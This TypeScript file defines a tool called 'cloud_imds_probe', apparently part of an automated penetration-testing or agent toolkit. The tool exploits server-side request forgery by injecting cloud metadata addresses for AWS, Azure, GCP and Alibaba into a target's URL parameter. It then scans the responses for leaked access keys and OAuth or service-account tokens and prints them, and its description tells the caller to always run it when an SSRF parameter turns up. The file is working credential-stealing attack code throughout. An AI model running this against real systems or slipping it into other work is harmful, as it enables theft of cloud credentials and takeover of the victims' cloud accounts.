// T49 — cloud_imds_probe
// Cloud metadata service (IMDS) exploitation via SSRF.
// AWS IMDSv1/v2, Azure IMDS, GCP metadata, Alibaba Cloud.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'cloud_imds_probe',
  description:
    'Exploit SSRF to reach cloud metadata services (IMDS). Tests AWS IMDSv1 direct, ' +
    'AWS IMDSv2 via TTL header smuggling, Azure IMDS, GCP metadata, and Alibaba Cloud metadata. ' +
    'A successful IMDS hit leaks cloud credentials, instance identity, and service account tokens. ' +
    'Always run when an SSRF parameter is found.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',            type: 'string', required: true,  description: 'Target URL (with SSRF parameter)' },
    { name: 'ssrf_parameter', type: 'string', required: true,  description: 'Parameter name that controls the fetched URL' },
    { name: 'cloud_provider', type: 'string', required: false, description: 'auto | aws | azure | gcp | alibaba', default: 'auto' },
    { name: 'method',         type: 'string', required: false, description: 'HTTP method', default: 'GET' },
    { name: 'headers',        type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms',     type: 'number', required: false, description: 'Per-request timeout ms', default: 15000 },
  ],
};

const IMDS_ENDPOINTS = [
  // AWS IMDSv1 (no auth header required)
  { name: 'aws_imdsv1_iam_list',     url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', provider: 'aws',    note: 'AWS IMDSv1: list IAM roles' },
  { name: 'aws_imdsv1_instance_id',  url: 'http://169.254.169.254/latest/meta-data/instance-id',               provider: 'aws',    note: 'AWS IMDSv1: instance ID' },
  { name: 'aws_imdsv1_ami_id',       url: 'http://169.254.169.254/latest/meta-data/ami-id',                    provider: 'aws',    note: 'AWS IMDSv1: AMI ID' },
  // AWS IMDSv2 session token via PUT (smuggled via header injection)
  { name: 'aws_imdsv2_token',        url: 'http://169.254.169.254/latest/api/token',                           provider: 'aws',    note: 'AWS IMDSv2: session token (PUT with TTL header)' },
  // Azure IMDS
  { name: 'azure_imds_instance',     url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',   provider: 'azure',  note: 'Azure IMDS: instance metadata' },
  { name: 'azure_imds_identity',     url: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', provider: 'azure', note: 'Azure IMDS: managed identity OAuth token' },
  // GCP metadata
  { name: 'gcp_metadata_project',    url: 'http://metadata.google.internal/computeMetadata/v1/project/project-id', provider: 'gcp', note: 'GCP metadata: project ID' },
  { name: 'gcp_metadata_sa_token',   url: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', provider: 'gcp', note: 'GCP metadata: SA access token' },
  // Alibaba Cloud
  { name: 'alibaba_imds_role',       url: 'http://100.100.100.200/latest/meta-data/ram/security-credentials/', provider: 'alibaba', note: 'Alibaba Cloud IMDS: RAM role credentials' },
  // Alternative IMDS IPs
  { name: 'alt_imds_ipv6',           url: 'http://[fd00:ec2::254]/latest/meta-data/',                          provider: 'aws',    note: 'AWS IMDS via IPv6' },
];

export const cloudImdsProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const ssrfParam = String(params.ssrf_parameter || '');
    const cloudProvider = String(params.cloud_provider || 'auto');
    const method = String(params.method || 'GET').toUpperCase();
    const timeoutMs = Number(params.timeout_ms || 15000);

    if (!url || !ssrfParam) return { output: 'url and ssrf_parameter required', parsed: { error: 'missing_params' } };

    let headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(headers, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const endpoints = cloudProvider === 'auto'
      ? IMDS_ENDPOINTS
      : IMDS_ENDPOINTS.filter(e => e.provider === cloudProvider);

    const results: Array<{ name: string; imds_url: string; status: number; body_excerpt: string; time_ms: number; credential_found: boolean; note: string; error?: string }> = [];

    for (const endpoint of endpoints) {
      const start = Date.now();
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        let fetchUrl = url;
        let body: string | undefined;
        const hdrs = { ...headers };

        if (method === 'GET') {
          const u = new URL(url);
          u.searchParams.set(ssrfParam, endpoint.url);
          fetchUrl = u.toString();
        } else {
          body = JSON.stringify({ [ssrfParam]: endpoint.url });
          hdrs['Content-Type'] = 'application/json';
        }

        // For IMDSv2, also try the PUT variation via smuggled header
        if (endpoint.name === 'aws_imdsv2_token') {
          hdrs['X-aws-ec2-metadata-token-ttl-seconds'] = '21600';
        }
        if (endpoint.provider === 'azure') {
          hdrs['Metadata'] = 'true';
        }
        if (endpoint.provider === 'gcp') {
          hdrs['Metadata-Flavor'] = 'Google';
        }

        const resp = await fetch(fetchUrl, { method, headers: hdrs, body, signal: controller.signal });
        clearTimeout(timer);
        const text = await resp.text();

        const credentialFound = /AccessKeyId|SecretAccessKey|Token|iam\/security-credentials|access_token|client_id|type.*service_account/i.test(text);
        results.push({ name: endpoint.name, imds_url: endpoint.url, status: resp.status, body_excerpt: text.substring(0, 200).replace(/\s+/g, ' '), time_ms: Date.now() - start, credential_found: credentialFound, note: endpoint.note });
      } catch (err) {
        results.push({ name: endpoint.name, imds_url: endpoint.url, status: 0, body_excerpt: '', time_ms: Date.now() - start, credential_found: false, note: endpoint.note, error: String(err) });
      }
    }

    const credHits = results.filter(r => r.credential_found);
    const lines = [
      `cloud_imds_probe — ${endpoints.length} IMDS endpoints, param="${ssrfParam}"`,
      `Target: ${url.substring(0, 80)}`,
      `CREDENTIAL LEAKS: ${credHits.length}/${results.length}  ← CRITICAL if any`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.credential_found ? '🔑 CREDENTIAL' : (r.status === 200 && r.body_excerpt ? '⚡ RESPONSE  ' : (r.error ? '✗ ERR       ' : '  ·         '));
      lines.push(`  ${flag}  [${r.name.padEnd(28)}]  status=${r.status}  ${r.note}`);
      if (r.credential_found) lines.push(`          LEAKED: "${r.body_excerpt.substring(0, 120)}"`);
    }

    return {
      output: lines.join('\n'),
      parsed: { total: results.length, credential_count: credHits.length, credentials: credHits, results },
    };
  },
};
